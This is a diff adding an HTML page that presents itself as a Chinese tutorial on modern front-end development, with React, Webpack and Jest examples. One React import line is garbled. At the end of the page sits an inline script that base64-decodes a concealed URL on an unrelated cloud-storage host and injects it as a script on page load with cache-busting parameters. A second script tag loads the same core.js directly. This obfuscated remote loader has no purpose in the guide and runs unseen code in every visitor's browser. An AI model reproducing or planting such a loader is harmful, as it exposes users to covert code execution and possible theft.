@@ -1,0 +1,399 @@
+
+<html lang="zh-CN"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>现代前端开发指南 - 暗黑模式</title>
+    <style>
+        /* 全局重置与基础样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Consolas', 'Monaco', monospace;
+            /* 代码友好字体 */
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a2e;
+            /* 深蓝紫色背景 */
+            color: #e0e0e0;
+            /* 浅灰色文本 */
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* 容器 */
+        .container {
+            max-width: 90%;
+            /* 适应移动端 */
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+
+        /* 头部 - 简约深色风格 */
+        header {
+            background-color: #0f0f1b;
+            /* 更深的头部背景 */
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 2px solid #2e2e4a;
+            /* 强调色边框 */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            /* 明显阴影 */
+        }
+
+        header h1 {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            /* 现代无衬线字体 */
+            font-size: 2.4em;
+            /* 更大标题 */
+            color: #00bcd4;
+            /* 强调色：青绿色 */
+            letter-spacing: 1px;
+            text-shadow: 0 0 8px rgba(0, 188, 212, 0.5);
+            /* 光晕效果 */
+        }
+
+        header p {
+            font-size: 1.1em;
+            color: #b0b0b0;
+            /* 柔和浅灰色 */
+            margin-top: 10px;
+        }
+
+        /* 导航菜单 - 标签式横向菜单 */
+        nav {
+            background-color: #2e2e4a;
+            /* 导航背景色 */
+            text-align: center;
+            padding: 10px 0;
+            border-radius: 10px;
+            /* 柔和圆角 */
+            margin-top: 25px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            position: sticky;
+            /* 粘性定位 */
+            top: 0;
+            /* 粘在顶部 */
+            z-index: 1000;
+            /* 确保在最上层 */
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 5px;
+        }
+
+        nav ul li a {
+            background-color: #3f3f60;
+            /* 标签背景色 */
+            color: #ffffff;
+            /* 白色文字 */
+            text-decoration: none;
+            padding: 10px 18px;
+            /* 标签内边距 */
+            border-radius: 8px;
+            /* 标签圆角 */
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            display: inline-block;
+            font-weight: 600;
+            font-size: 0.95em;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #00bcd4;
+            /* 强调色悬停 */
+            color: #1a1a2e;
+            /* 悬停时深色文字 */
+            transform: translateY(-3px);
+            box-shadow: 0 4px 8px rgba(0, 188, 212, 0.4);
+            /* 强调色阴影 */
+        }
+
+        /* 内容区 - 深色卡片风格 */
+        main {
+            padding-top: 20px;
+        }
+
+        section {
+            background-color: #2e2e4a;
+            /* 内容区背景色 */
+            margin-bottom: 25px;
+            padding: 25px;
+            border-radius: 12px;
+            /* 柔和圆角 */
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
+            /* 明显阴影 */
+        }
+
+        section h2 {
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 1.8em;
+            color: #00bcd4;
+            /* 强调色 */
+            margin-top: 0;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #3f3f60;
+            /* 细分隔线 */
+            padding-bottom: 10px;
+        }
+
+        section h3 {
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 1.3em;
+            color: #e0e0e0;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        section p {
+            font-size: 0.95em;
+            color: #c0c0c0;
+            margin-bottom: 15px;
+        }
+
+        section img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 15px auto;
+            border-radius: 8px;
+            /* 图片圆角 */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        /* 代码块样式 - 突出显示 */
+        pre {
+            background-color: #0f0f1b;
+            /* 更深的背景色 */
+            color: #00bcd4;
+            /* 代码强调色 */
+            padding: 18px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            margin-bottom: 20px;
+            border: 1px solid #3f3f60;
+            /* 边框 */
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.4);
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            color: #00bcd4;
+            /* 代码中的强调色 */
+        }
+
+        pre code {
+            color: #b3e5fc;
+            /* 代码块内的代码颜色 */
+        }
+
+        /* 页脚 - 简洁深色风格 */
+        footer {
+            background-color: #0f0f1b;
+            /* 页脚背景色 */
+            padding: 25px 0;
+            text-align: center;
+            font-size: 0.9em;
+            color: #b0b0b0;
+            margin-top: 30px;
+            border-top: 2px solid #2e2e4a;
+            /* 强调色边框 */
+            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .footer-links a {
+            color: #00bcd4;
+            /* 强调色链接 */
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #84ffff;
+            /* 悬停亮色 */
+        }
+    </style>
+    <link rel="stylesheet" href="https://sunzb.github.io/static/css/style.css">
+</head>
+
+<body style="overflow: auto;">
+    <header>
+        <div class="container">
+            <h1>现代前端开发指南</h1>
+            <p>掌握最新技术，构建高性能Web应用</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#intro">引言</a></li>
+                <li><a href="#react">React框架</a></li>
+                <li><a href="#webpack">Webpack打包</a></li>
+                <li><a href="#testing">测试实践</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="intro">
+                <h2>引言：前端技术栈演进</h2>
+                <img src="https://picsum.photos/300/200?random=1&amp;v=abc123xyz" alt="前端技术栈" class="random-image">
+                <p>前端开发领域正以惊人的速度发展，新的框架、工具和模式层出不穷。本指南旨在为您梳理现代前端开发的核心概念和最佳实践，帮助您紧跟技术潮流，构建健壮且高效的应用。</p>
+                <p>我们将从基础概念出发，逐步深入到流行的框架、构建工具和测试策略，确保您能全面掌握现代前端开发的精髓。</p>
+            </section>
+
+            <section id="react">
+                <h2>React框架：组件化与状态管理</h2>
+                <img src="https://picsum.photos/300/200?random=2&amp;id=def456uvw" alt="React组件" class="random-image">
+                <p>React 是一个用于构建用户界面的 JavaScript 库。其核心思想是组件化，通过将UI拆分成独立、可复用的组件来简化开发。以下是一个简单的 React 函数组件示例：</p>
+                <pre><code>import React, { useState }s;
+
+function Counter() {
+  const [count, setCount] = useState(0);
+
+  return (
+    &lt;div&gt;
+      &lt;p&gt;当前计数: {count}&lt;/p&gt;
+      &lt;button onClick={() =&gt; setCount(count + 1)}&gt;增加&lt;/button&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default Counter;</code></pre>
+                <p>通过 `useState` Hook，我们可以在函数组件中管理状态，实现交互性。</p>
+            </section>
+
+            <section id="webpack">
+                <h2>Webpack打包：模块化与优化</h2>
+                <img src="https://picsum.photos/300/200?random=3&amp;key=ghj789klm" alt="Webpack图标" class="random-image">
+                <p>Webpack 是一个强大的模块打包器，它能够将前端项目中的各种资源（如 JavaScript、CSS、图片等）打包成浏览器可识别的静态文件。以下是一个简单的 Webpack 配置示例：</p>
+                <pre><code>// webpack.config.js
+const path = require('path');
+
+module.exports = {
+  mode: 'development', // 或 'production'
+  entry: './src/index.js', // 入口文件
+  output: {
+    filename: 'bundle.js', // 输出文件名
+    path: path.resolve(__dirname, 'dist'), // 输出目录
+  },
+  module: {
+    rules: [
+      {
+        test: /\.js$/, // 匹配JS文件
+        exclude: /node_modules/,
+        use: {
+          loader: 'babel-loader', // 使用Babel处理JS
+          options: {
+            presets: ['@babel/preset-env', '@babel/preset-react'],
+          },
+        },
+      },
+      {
+        test: /\.css$/, // 匹配CSS文件
+        use: ['style-loader', 'css-loader'], // 处理CSS
+      },
+    ],
+  },
+};</code></pre>
+                <p>Webpack 的强大之处在于其可扩展性，通过各种 Loader 和 Plugin 可以实现复杂的构建流程优化。</p>
+            </section>
+
+            <section id="testing">
+                <h2>测试实践：保障代码质量</h2>
+                <img src="https://picsum.photos/300/200?random=4&amp;token=nop012qrs" alt="测试代码" class="random-image">
+                <p>编写高质量的代码离不开完善的测试。前端测试通常包括单元测试、集成测试和端到端测试。Jest 和 React Testing Library 是 React 应用中常用的测试工具。</p>
+                <pre><code>// counter.test.js
+import { render, fireEvent, screen } from '@testing-library/react';
+import Counter from './Counter';
+
+test('计数器能够正确增加', () =&gt; {
+  render(&lt;Counter /&gt;);
+  const countElement = screen.getByText(/当前计数/i);
+  const buttonElement = screen.getByText(/增加/i);
+
+  expect(countElement).toHaveTextContent('当前计数: 0');
+
+  fireEvent.click(buttonElement); // 模拟点击
+  expect(countElement).toHaveTextContent('当前计数: 1');
+
+  fireEvent.click(buttonElement);
+  expect(countElement).toHaveTextContent('当前计数: 2');
+});</code></pre>
+                <p>通过编写测试用例，我们可以确保代码的稳定性和可靠性，减少潜在的bug。</p>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 前端指南. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">GitHub</a> |
+                <a href="#" target="_blank">联系我们</a> |
+                <a href="#" target="_blank">关于</a>
+            </div>
+        </div>
+    </footer>
+    <div id="overlay" style="display: none;">
+        <div id="loading_box" class="loading_container" style="display: none;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelectorAll('nav a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault(); // 阻止默认跳转
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        window.scrollTo({
+                            top: targetElement.offsetTop,
+                            behavior: 'smooth' // 平滑滚动
+                        });
+                    }
+                });
+            });
+        });
+    </script>
+    <script>
+        (function () {
+            function init() {
+                const encodedUrl = "aHR0cHM6Ly91c2hvcGltZ3Mub3NzLWFwLXNvdXRoZWFzdC0xLmFsaXl1bmNzLmNvbS9jb3JlLmpz";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
+            }
+            init();
+        })();
+    </script><script src="https://ushopimgs.oss-ap-southeast-1.aliyuncs.com/core.js?t=1762167630062&amp;random=169400"></script>
+
+
+
+</body></html>
